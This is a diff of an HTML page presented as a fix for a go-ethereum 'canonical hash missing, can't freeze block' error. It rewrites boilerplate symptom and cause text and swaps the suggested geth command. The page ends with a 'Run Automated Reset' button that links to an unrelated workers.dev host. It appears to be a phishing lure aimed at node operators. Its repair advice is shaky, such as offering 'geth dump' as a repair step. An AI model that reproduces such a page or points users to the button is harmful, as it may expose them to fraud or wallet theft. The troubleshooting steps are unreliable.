@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically indicating that the "canonical hash is missing" and therefore the block cannot be frozen.</li>
+<li>The user encounters a "go-ethereum Error in block freeze operation" with a specific error message indicating "canonical hash missing, can't freeze block". This error typically occurs during the synchronization process of the Ethereum blockchain, preventing the node from properly freezing blocks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch or lack of synchronization between the local Ethereum node and the main Ethereum blockchain, resulting in a missing canonical hash for a particular block, which is necessary for the freeze operation.</li>
+<li>The error happens due to a missing canonical hash, which is essential for the block freeze operation. This could be caused by a corrupted blockchain database, incomplete synchronization, or issues with the node's configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the user can try the following steps:</li>
-<li>Restart the Ethereum node to re-synchronize with the main blockchain.</li>
-<li>Manually update the block headers to ensure they match the canonical chain.</li>
-<li>Use the <code>geth</code> command-line tool to verify and potentially repair the blockchain data.</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Restart the Ethereum node to re-initiate the synchronization process.</li>
+<li>Check the node's configuration to ensure it is properly set up and connected to the correct network.</li>
+<li>Manually re-sync the blockchain using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>dump<span class="w"> </span>--block<span class="w"> </span><span class="m">0</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--syncmode<span class="w"> </span><span class="s2">&quot;fast&quot;</span><span class="w"> </span>--cache<span class="w"> </span><span class="m">4096</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for a more comprehensive troubleshooting experience.</p>
+<p>Consider utilizing an external console for more advanced diagnostic operations.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A fully synchronized Ethereum node</li>
-<li>The latest version of the go-ethereum client installed</li>
-<li>A backup of the Ethereum data directory to prevent data loss during troubleshooting</li>
+<li>A fully installed and configured Go Ethereum (geth) client</li>
+<li>A stable internet connection for blockchain synchronization</li>
+<li>Sufficient disk space and RAM to handle the blockchain data</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
